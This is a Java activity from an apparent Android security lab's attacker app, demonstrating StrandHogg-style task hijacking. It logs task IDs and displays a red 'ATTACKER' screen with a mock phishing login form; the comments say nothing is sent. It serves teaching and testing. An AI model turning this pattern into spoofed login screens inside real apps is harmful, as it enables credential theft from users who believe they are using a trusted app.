// examples/hijacker-app/HijackActivity.java
// Package: com.pentest.ch30.attacker
//
// The activity whose MANIFEST is the attack. Read AndroidManifest.xml first --
// this file is almost empty on purpose.
//
// The screen is bright red and says "ATTACKER" because a task-hijacking lab has
// exactly one interesting outcome and you must be able to see it at a glance:
// after tapping the VICTIM's icon, is the phone showing white (victim) or red
// (attacker)? Everything else in the lab is corroboration for that one look.
//
// It also logs its taskId. Comparing that taskId with the victim's is the
// evidence that survives a screenshot: same taskId means the two apps' activities
// are in one task, which is what "hijacked" means. Different taskIds mean they
// are not, however similar their declared affinity strings look.
//
// AUTHORISED TESTING ONLY.

package com.pentest.ch30.attacker;

import android.app.Activity;
import android.graphics.Color;
import android.os.Bundle;
import android.util.Log;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;

public class HijackActivity extends Activity {

    protected static final String TAG = "CH30";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        String line = getClass().getSimpleName()
                + " taskId=" + getTaskId()
                + " instance=" + System.identityHashCode(this);
        Log.i(TAG, "ATTACKER " + line);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.parseColor("#B00020"));
        root.setPadding(40, 140, 40, 40);

        TextView banner = new TextView(this);
        banner.setText("ATTACKER APP\n(this is what the user would believe is the victim)\n"
                + line);
        banner.setTextColor(Color.WHITE);
        banner.setTextSize(18);
        root.addView(banner);

        // The phishing payload a real StrandHogg sample would show: a credential
        // form styled as the victim's login. Nothing is transmitted; it exists so
        // the lab's screenshot makes the consequence obvious.
        EditText user = new EditText(this);
        user.setHint("username");
        root.addView(user);
        EditText pass = new EditText(this);
        pass.setHint("password");
        root.addView(pass);

        setContentView(root);
    }

    @Override
    protected void onNewIntent(android.content.Intent intent) {
        super.onNewIntent(intent);
        // With launchMode="singleTask", a SECOND start lands here rather than
        // constructing a new instance. If you ever see this line fire in
        // response to launching the VICTIM, the hijack worked.
        Log.i(TAG, "ATTACKER onNewIntent taskId=" + getTaskId()
                + " instance=" + System.identityHashCode(this)
                + " intent=" + intent);
    }
}
